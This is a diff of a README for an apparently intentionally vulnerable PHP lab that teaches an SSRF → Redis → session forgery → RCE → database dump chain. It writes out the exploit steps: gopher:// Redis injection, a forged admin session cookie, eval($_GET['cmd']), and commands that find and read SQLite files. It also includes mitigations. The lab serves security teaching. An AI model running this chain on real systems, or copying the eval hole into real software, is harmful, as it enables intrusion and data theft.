@@ -1,70 +1,199 @@
-# SSRF → Redis → RCE Attack Chain Demonstration
+SSRF → Redis Injection → Admin Session Forgery → Remote Code Execution → Database Dump
 
-# DEMO VIDEO LINK: https://drive.google.com/file/d/1UC3B_WpSMfuMuKdH6n_pT1jDMu99KdyZ/view?usp=sharing
+Demo Video:
+https://drive.google.com/file/d/1UC3B_WpSMfuMuKdH6n_pT1jDMu99KdyZ/view?usp=sharing
 
-## 🎯 Project Overview
-This educational project demonstrates a complete attack chain from Server-Side Request Forgery (SSRF) to Remote Code Execution (RCE) through Redis injection. The vulnerable web application is intentionally designed to show how multiple security flaws chain together for complete system compromise.
+SECURITY WARNING
+FOR EDUCATIONAL USE ONLY — DO NOT DEPLOY IN PRODUCTION
 
-## ⚠️ SECURITY WARNING
-**FOR EDUCATIONAL USE ONLY IN ISOLATED ENVIRONMENT**
-- Never deploy on production systems
-- Use in VM/Docker containers only
-- No sensitive data included
-- All demonstrations in controlled lab
+This project is intentionally vulnerable and designed strictly for learning and demonstration purposes in an isolated lab environment (Docker/ VM).
+No real user data
+No production hardening
+Vulnerabilities are introduced on purpose
+Demonstrates real-world attack chaining techniques
 
-## 🏗️ System Architecture
+Project Overview
+This project demonstrates a complete multi-stage attack chain starting from a Server-Side Request Forgery (SSRF) vulnerability and escalating into full system compromise, including:
 
-### Technology Stack
-- **Frontend**: HTML5, CSS3, JavaScript
-- **Backend**: PHP 8.2
-- **Session Store**: Redis (no authentication)
-- **Database**: SQLite
-- **Web Server**: Apache/Nginx
-- **Container**: Docker (recommended)
+Internal Redis access
+Authentication bypass
+Remote Code Execution (RCE)
+SQLite database disclosure
+The goal is to show how individually simple vulnerabilities become critical when chained together.
 
-### Application Components
-1. **User Authentication System** (login.php, register.php)
-2. **Note Management System** (notes.php)
-3. **Admin Control Panel** (admin.php)
-4. **URL Import Feature** (import_note.php)
-5. **File Export Functionality** (export.php)
+Application Architecture
+Technology Stack
+Backend: PHP 8.2
+Database: SQLite
+Session Store: Redis (no authentication)
+Web Server: Apache / Nginx
+Environment: Docker (recommended)
+Application Port: http://localhost:8080
 
-## 📋 Vulnerable Components
+Application Components
+User authentication (login / register)
+Notes management
+Admin control panel
+URL import functionality
+Export functionality
 
-### 1. SSRF Vulnerability - `import_note.php`
-**Location**: `/var/www/html/public/import_note.php`
-**Vulnerability**: Unvalidated URL parameter allows accessing internal services
-**Root Cause**: `file_get_contents()` accepts user-supplied URLs without validation
-**Exploits**: Redis protocol injection via `gopher://` and `dict://`
+Deliverables
+This repository contains:
+A deliberately vulnerable PHP web application
+A custom exploit generator for SSRF → Redis attacks
+A demo video showing live exploitation
+Vulnerability documentation and proof-of-concept attacks
 
-### 2. Missing Redis Authentication
-**Location**: Redis server configuration
-**Vulnerability**: Redis accessible without password
-**Root Cause**: Default configuration with `requirepass` not set
-**Impact**: Arbitrary data injection into session store
+Attack Chain Summary
+SSRF
+ → Redis Injection
+ → Admin Session Forgery
+ → Remote Code Execution
+ → Database Dump
 
-### 3. Code Injection - `admin.php`
-**Location**: `/var/www/html/public/admin.php`
-**Vulnerability**: `eval()` executes Redis content as PHP code
-**Root Cause**: Untrusted Redis data passed directly to `eval()`
-**Impact**: Remote Code Execution (RCE)
+High-Level Flow
+Attacker abuses SSRF in import_note.php
+SSRF allows gopher:// access to internal Redis
+Redis session keys are injected
+Attacker forges an admin session
+Admin panel executes attacker-controlled eval()
+SQLite database files are discovered and dumped
 
-### 4. Arbitrary File Write - `export.php`
-**Location**: `/var/www/html/public/export.php`
-**Vulnerability**: Writes Redis content to files without validation
-**Root Cause**: No content validation before file creation
-**Impact**: Webshell deployment to webroot
+Vulnerable Components
 
-## 🚀 Quick Setup
+1️. Server-Side Request Forgery (SSRF)
+Endpoint: /import_note.php
+Parameter: url
+Root Cause:
+User input is passed directly to file_get_contents() without validation.
+$content = @file_get_contents($url, false, $ctx);
+Impact:
+Allows attackers to access internal services, including Redis.
 
-### Docker Setup (Recommended)
-```bash
-# Clone or extract project files
-cd ssrf-redis-rce-demo
+2️. Redis Injection via SSRF
+Redis Location: 127.0.0.1:6379
+Authentication: None
+Root Cause:
+Redis is accessible internally and accepts unauthenticated commands.
+Using SSRF with the gopher:// protocol, raw Redis RESP commands can be injected.
+Impact:
+Arbitrary key creation
+Session manipulation
+Data injection
 
-# Start the environment
-docker-compose up -d
+3️. Admin Session Forgery
+Session Key Format: session_<SID>
+Storage: Redis
+Root Cause:
+Session data is trusted without integrity validation.
+By injecting:
+SET session_admin_from_ssrf {"user":"admin","role":"admin"} and setting the browser cookie:
+SID=admin_from_ssrf
+the attacker gains admin access.
 
-# Access the application
-http://localhost:8080
+4️. Remote Code Execution (RCE)
+Location: admin.php
+Root Cause: User-controlled input is passed directly to eval().
+eval($_GET['cmd']);
+Impact: Arbitrary system command execution.
+Example: http://localhost:8080/admin.php?execute=eval&cmd=id
+
+5️. Database Disclosure
+Database Type: SQLite
+Root Cause: RCE allows unrestricted filesystem access.
+Example commands:
+find / -name "*.sqlite"
+cat /app/data/database.sqlite
+Impact: Full database dump and data exposure.
+
+Custom Exploit Generator
+
+File: exploits/redis_exploit_generator.py
+
+This script automates the entire SSRF → Redis exploitation process.
+
+Capabilities
+Builds valid Redis RESP commands
+Encodes payloads into gopher:// URLs
+Generates SSRF-ready exploit links
+
+Injects:
+Admin session
+Webshell payload
+Database marker payloads
+Saves exploit artifacts for review
+
+Example Output
+Admin session injection URL
+Webshell injection URL
+Database payload URL
+This demonstrates exploit automation, not manual exploitation.
+
+Exploit Execution
+Step 1 — Generate Payloads
+python exploits/redis_exploit_generator.py
+Step 2 — Inject Admin Session via SSRF
+Open generated URL:
+http://localhost:8080/import_note.php?url=gopher://127.0.0.1:6379/...
+
+Step 3 — Access Admin Panel
+Set browser cookie:
+SID=admin_from_ssrf
+Visit:
+http://localhost:8080/admin.php
+
+Step 4 — Execute RCE
+http://localhost:8080/admin.php?execute=eval&cmd=whoami
+
+Step 5 — Dump Database
+http://localhost:8080/admin.php?execute=eval&cmd=find%20/%20-name%20"*.sqlite"
+
+Impact Demonstrated
+
+Authentication bypass
+Internal service compromise
+Arbitrary command execution
+Complete database disclosure
+Full loss of confidentiality and integrity
+
+Alternative Exploitation Paths (Theoretical)
+
+Depending on configuration, attackers could also attempt:
+SSRF → internal HTTP services
+SSRF → metadata services (cloud environments)
+Redis → session fixation only
+Redis → persistence abuse
+RCE → privilege escalation
+These paths were not required to demonstrate the core chain.
+
+Mitigation & Fix Recommendations
+SSRF
+Restrict allowed URL schemes
+Block internal IP ranges
+Use allowlists instead of blacklists
+
+Redis
+Enable authentication (requirepass)
+Bind Redis to localhost or private network
+Use firewall rules and segmentation
+PHP / RCE
+Remove eval() entirely
+Validate and sanitize all user input
+Use safe command execution patterns
+
+Architecture
+Do not trust internal services by default
+Apply defense-in-depth
+Conduct regular security reviews
+
+Lessons Learned
+
+This project demonstrates how low-complexity vulnerabilities can combine into critical system compromise.
+SSRF is rarely an isolated issue — when internal services are insecure, it becomes a powerful pivot point.
+
+Intentional Vulnerability Design
+
+All vulnerabilities in this application were intentionally introduced to demonstrate realistic exploitation chains in a controlled environment.
+
+The goal is education, not production readiness.
 
